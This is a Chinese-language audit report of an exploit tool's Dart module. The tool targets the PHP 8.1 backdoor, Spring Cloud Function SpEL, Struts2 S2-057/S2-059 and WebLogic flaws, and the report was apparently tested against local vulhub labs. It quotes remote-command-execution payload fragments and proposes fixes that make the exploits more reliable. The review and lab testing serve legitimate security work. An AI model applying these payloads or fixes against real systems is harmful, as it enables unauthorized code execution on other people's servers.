# exp 漏洞模块审计

- 日期：2026-11-18
- 分支：dev20261118
- 范围：`lib/exp/**`（17 个 Dart 文件 / 4,501 行）、对应入口页 `lib/pages/vulhub/*`、`thinkphp_exp_page`、`zentao_exp_page`
- 方法：静态阅读 + 模式检索 + 本机 PHP 验证载荷语义
- 局限：未对 Struts2/Spring/WebLogic 起靶场做端到端验证（本地只有 Shiro/Tomcat 镜像）

## 0. 结论

exp 模块**没有"被远程利用"的风险**（它本来就是攻击方），真正的风险是**误判**：
探测失败与"目标安全"在数据模型上无法区分，界面直接输出"未检测到或已修复"。
另有 3 处命令载荷转义缺陷会让**用户输入的命令变形或静默失败**。

| 编号 | 问题 | 等级 |
| --- | --- | --- |
| F1 | 探测失败 ≡ 未发现漏洞 | **高** |
| F2 | PHP 载荷 `$` 未转义，命令被 PHP 插值 | 中 |
| F3 | Spring Cloud Function SpEL 直接拼接命令 | 中 |
| F4 | S2-059 只转义引号，漏反斜杠 | 中 |
| F5 | S2-057 硬编码 `http://`、丢弃 base path | 中 |
| F6 | WebLogic 检测无条件关闭 TLS 校验 | 中 |
| F7 | `SystemEncoding()` 解码非 UTF-8 响应会抛异常 | 低 |
| F8 | struts2 24 处静默 `catch (_)` | 低 |
| F9 | 4,501 行只有 1 个测试 | 低 |
| F10 | Spring Cloud Function 检测漏报（靶场实测） | **高** |
| F11 | S2-059 命令执行在靶场返回 null | 中 |

---

## F1【高】探测失败 ≡ 未发现漏洞

**证据**

```dart
// lib/exp/vulhub/services/exp_result.dart 全文
class ExpResult {
  final bool vulnerable;   // ← 只有"是/否"，没有"没测出来"
  final String vulnName;
  final String detail;
```

25 个 `check*` 方法里 **23 个**以 `ExpResult(false, ...)` 收尾，且普遍是这种形状：

```dart
// lib/exp/vulhub/services/runtime_services.dart:34-40
try {
  final res = await _httpClient.get(...);
  if (res.body.contains('PHP_BACKDOOR_54289')) return ExpResult(true, ...);
} catch (_) {}
return const ExpResult(false, 'PHP 8.1.0-dev 后门', '');
```

界面据此输出**确定性结论**：

- `lib/pages/vulhub/nacos_exp_page.dart:59` → `'[-] No vulnerability detected'`
- `lib/pages/vulhub/xxljob_exp_page.dart:51` → `'[-] 未检测到或已修复'`

**影响**：目标超时、DNS 失败、证书错误、反代 502、WAF 挡掉探测包 —— 全部显示成"未发现漏洞"。
对授权评估来说这是最危险的一类错误（把"没测通"当成"安全"）。

**修复**

1. `ExpResult` 增加第三态（`vulnerable` / `notDetected` / `error`），或至少在 `detail` 写明失败原因；
2. `catch` 里返回 `ExpResult.error(...)`，保留 `e.toString()` 摘要；
3. UI 用黄色 warning 渲染 error 态，而不是绿色/灰色"未发现"。

---

## F2【中】PHP 载荷 `$` 未转义，命令被 PHP 插值

**证据**

```dart
// lib/exp/vulhub/services/runtime_services.dart:58-61
final escaped = cmd.replaceAll('"', r'\"');          // 只转义了双引号
'User-Agentt': "zerodiumecho '..._S';system(\"$escaped\");echo '..._E';";
```

PHP 双引号字符串会做变量插值，本机验证：

| 载荷 | 结果 |
| --- | --- |
| `system("echo $USER")` | `Undefined variable: USER` → 命令变成 `echo ` |
| `system("echo \$USER")` | 正常输出用户名 |
| `system("echo a\")` | **PHP 语法错误**（反斜杠未转义） |

**影响**：`echo $PATH`、`ls $HOME`、`awk '{print $1}'`、以及任何以 `\` 结尾的命令全部失败或变形。
`runtime_services.dart:128`（PHP-CGI CVE-2012-1823）用了 `RceEncoder.escapeDoubleQuoted`（转义 `\` 与 `"`），**但仍缺 `$`**，同样中招。

**修复**：新增 `RceEncoder.phpSingleQuoted()`（PHP 单引号只需转义 `\` 与 `'`），载荷改成 `system('...')` / `shell_exec('...')`，彻底绕开插值。

---

## F3【中】Spring Cloud Function SpEL 直接拼接命令

**证据**

```dart
// lib/exp/vulhub/spring_exp_service.dart:444
final spel2 =
  'new java.util.Scanner(T(java.lang.Runtime).getRuntime()'
  '.exec(new String[]{"/bin/bash","-c","$cmd"}).getInputStream())...';
```

`$cmd` 原样进入 **Java 双引号字符串**，既没转义 `"` 也没转义 `\`。

**影响**：
- 命令含 `"` → 提前闭合字符串，SpEL 解析失败或被改写；
- 命令含 `\`（例如 `sed 's/\//x/'`、Windows 路径）→ Java 转义序列被解释，命令变形。

**修复**：`RceEncoder.escapeDoubleQuoted(cmd)`（已存在，转义 `\` 与 `"`），并用单测锁住。

---

## F4【中】S2-059 只转义双引号，漏反斜杠

```dart
// lib/exp/vulhub/struts2_exp_service.dart:534
'.(#proc=@java.lang.Runtime@getRuntime().exec("${cmd.replaceAll('"', '\\"')}"))'
```

同 F3：Java 字符串里 `\` 未转义。`cmd` 为 `grep -\d` 或 `C:\Windows\...` 时变形。
修复：改用 `RceEncoder.escapeDoubleQuoted`。

---

## F5【中】S2-057 硬编码 `http://`、丢弃 base path

```dart
// lib/exp/vulhub/struts2_exp_service.dart:168（探测）与 :484（执行）
'http://${baseUri.host}:${baseUri.port}/$path/.../actionChain1.action'
```

**影响**：
- HTTPS 目标（443）被当成明文 HTTP 访问 → 握手失败；
- 目标挂在反代子路径（`https://host/app/`）时，构造出的 URL 丢掉前缀 → 404。

失败后又会被 F1 吃成"未发现漏洞"。

**修复**：用 `baseUri.scheme` 与 `baseUri.replace(path: ...)` 保留前缀与协议。

---

## F6【中】WebLogic 检测无条件关闭 TLS 校验

```dart
// lib/exp/vulhub/services/runtime_services.dart:387
final client = HttpClient()..badCertificateCallback = (_, __, _) => true;
```

该检测只读 Location/响应体，完全可以用正常校验；关闭后 HTTPS 目标可被中间人伪造"存在/不存在"。
其余检测都走 `MatrixHttpClient(allowBadCertificate: false)`，此处不一致。

**修复**：默认开启校验；自签名场景显式传入开关。

---

## F7【低】`SystemEncoding()` 解码非 UTF-8 响应会抛异常

```dart
// lib/exp/vulhub/services/runtime_services.dart:395
final body = await res.transform(SystemEncoding().decoder).join();
```

macOS/Linux 上 `SystemEncoding` 即 UTF-8；WebLogic 控制台若返回 GBK 或二进制，会抛 `FormatException`，再被外层 `catch` 吃成 `false`（与 F1 叠加）。

**修复**：`utf8.decode(bytes, allowMalformed: true)` 或 latin1 兜底。

---

## F8【低】struts2 24 处静默 `catch (_)`

`struts2_exp_service.dart` 内 24 处空 catch，探测/利用失败时无任何日志，用户只能看到最终"未发现"。
建议至少把异常摘要写进 `onLog` 或返回的 detail。

---

## F9【低】测试覆盖

- `lib/exp` 4,501 行，`test/exp` 只有 **1 个** 测试文件（`spring_exp_service_test.dart`，126 行，仅覆盖 `checkSpringCloudFunction` 的请求形状）。
- 建议补：`RceEncoder` 纯函数单测、各 payload builder 的快照测试（不需要靶场）。

---

## F10【高】Spring CVE-2022-22963 检测在真实靶场漏报

靶场：`vulhub/spring-cloud-function:3.2.2`（`/Users/illya/Projects/vulhub/spring/CVE-2022-22963`）

- 手动验证**确实可利用**：`T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")` → 容器内 `/tmp/pwned` 生成；
- 但原检测返回 `vulnerable=false`：载荷 `233*233` 被当作"函数名"路由，服务端回 **500 + 通用 JSON**，响应体里没有任何 SpEL 关键字。

**修复**：改成**时间侧信道**——注入 `...exec("sleep 3").waitFor()` 并对比基线耗时。
注意 `Runtime.exec` 本身是非阻塞的，必须 `waitFor()`（实测：不带 waitFor 3ms，带 waitFor 3127ms）。

修复后实测：`vulnerable=true`，`延迟 3016ms（基线 93ms）`。

## F11【中】S2-059 命令执行在靶场返回 null

销售环境：`vulhub/struts2:2.5.16`。检测（数学运算）通过，但 `execS2059('echo S2059_OK')` 返回 `null`：
响应里 `<a id="">` 为空，说明沙箱绕过 + `exec("...")` 组合在该版本未生效。

**建议**：改用 Base64 传命令（Spring 侧已验证可行），或按版本区分 payload；暂列为后续项。

## 靶场联调结果（2026-11-18）

| 用例 | 修复前 | 修复后 |
| --- | --- | --- |
| PHP 8.1 后门 `check` | true | true |
| PHP `execRce('echo $HOME')` | 空（PHP 插值） | `/root` |
| PHP `execRce('echo "a b" \| tr a-z A-Z')` | — | `A B` |
| Spring `check` | **false（漏报）** | **true（延迟 3016ms）** |
| Spring `exec('touch "/tmp/matrix exec"')` | 未生成文件 | 文件生成 |
| S2-059 `check` | true | true |
| S2-059 `exec` | null | null（待适配，F11） |
| S2-057 `check` | true | true |
| S2-057 `exec('id')` | — | `uid=0(root)` |

## 做得好的地方（避免只报坏消息）

- ThinkPHP 的命令参数做了 `Uri.encodeComponent`（`thinkphp_v5_exp.dart:180/189`），没有裸拼；
- 绝大多数请求都带 `.timeout(timeout)`（静态扫描 84 个 URL 构造点，仅 4 处需人工确认，实为误报）；
- `http.Client()` 均有 `close()`，未发现连接泄漏；
- Struts2 的 S2-057 已经意识到"输出在 Location header"，禁用了重定向跟随。

## 建议修复顺序

| 顺序 | 项 | 风险 | 收益 |
| --- | --- | --- | --- |
| 1 | F1 三态结果 | 低（改 UI 展示） | 消除最危险的误判 |
| 2 | F2/F3/F4 转义 | 低（纯字符串 + 单测） | 命令不再静默变形 |
| 3 | F5 协议/前缀 | 低 | HTTPS 目标可用 |
| 4 | F6/F7 | 低 | 一致性 + 编码健壮性 |
| 5 | F8/F9 | 低 | 可观测性 + 回归保护 |
| 6 | F11 | 中 | S2-059 执行链适配 |
